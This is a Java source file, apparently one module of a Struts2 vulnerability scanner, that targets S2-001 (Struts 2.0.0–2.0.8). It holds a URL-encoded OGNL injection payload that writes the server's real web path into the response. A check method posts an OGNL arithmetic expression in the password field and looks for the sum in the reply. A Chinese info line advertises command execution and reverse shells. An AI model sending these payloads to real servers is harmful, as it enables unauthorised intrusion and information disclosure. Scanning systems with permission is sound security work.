package struts2scan.payload;

import javafx.scene.control.TextArea;
import struts2scan.controller.Log;
import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_001 implements Check {
    private final String path = "%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath('%2F'))%2C%23response.flush()%2C%23response.close()%7D";
    public String check_poc = "%%{%s+%s}";

    public static void printInfo(TextArea output){
        String info = "[+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password; 支持获取WEB路径,任意命令执行和反弹shell";
        Log.info(info,output);
    }



    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception {

        Map<String,String> data = new HashMap<String,String>();


        int number1 = new Random(10000).nextInt(10000);
        int number2 = new Random(10000).nextInt(10000);
        String poc = String.format(check_poc, number1, number2);
        data.put("username","test");
        data.put("password",poc);

        String url = protocol+"://"+host+":"+port+path;
        int numsum = number1+number2;
        HttpResult result = HttpClient.post(url,data);
/*        System.out.println(data);
        System.out.println(result.getData());*/
        Pattern p = Pattern.compile(String.valueOf(numsum));
        Matcher m =p.matcher(result.getData());


        if(m.find()){
            return true;
        }else{
            return false;
        }
    }


}
